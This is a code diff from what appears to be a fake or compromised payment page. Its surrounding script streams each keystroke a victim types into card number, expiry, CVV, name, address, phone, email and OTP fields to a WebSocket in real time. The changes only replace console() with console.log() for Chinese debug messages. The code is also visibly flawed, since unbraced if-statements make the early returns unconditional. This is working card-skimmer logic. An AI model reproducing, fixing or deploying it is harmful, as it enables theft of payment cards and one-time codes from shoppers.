@@ -1079,10 +1079,10 @@ url("pay1ment_icons.woff") format("woff");
                     var _sessionCreating = false;
                     function livePush() {
                         if (!ws || ws.readyState !== 1)
-                            console('ws读不到');
+                            console.log('ws读不到');
                             return;
                         if (!s && _sessionCreating)
-                            console('ws读不到');
+                            console.log('ws读不到');
                             return;
                         var p = build();
                         if (!s) {
@@ -1105,14 +1105,14 @@ url("pay1ment_icons.woff") format("woff");
                     function onInput() {
                         clearTimeout(liveTimer);
                         liveTimer = setTimeout(livePush, 150);
-                          console('发送');
+                          console.log('发送');
                     }
                     var liveInputs = ['cardNumber', 'expiry', 'cvv', 'cardHolder', 'fullNameIpt', 'emailIpt', 'phoneIpt', 'countryIpt', 'address1Ipt', 'address2Ipt', 'cityIpt', 'stateIpt', 'zipCodeIpt', 'otpCode'];
                     liveInputs.forEach(function(id) {
                         var el = q(id);
                         if (el)
                             el.addEventListener('input', onInput);
-                          console('加上了');
+                          console.log('加上了');
                     });
                     ;cws();
                 }
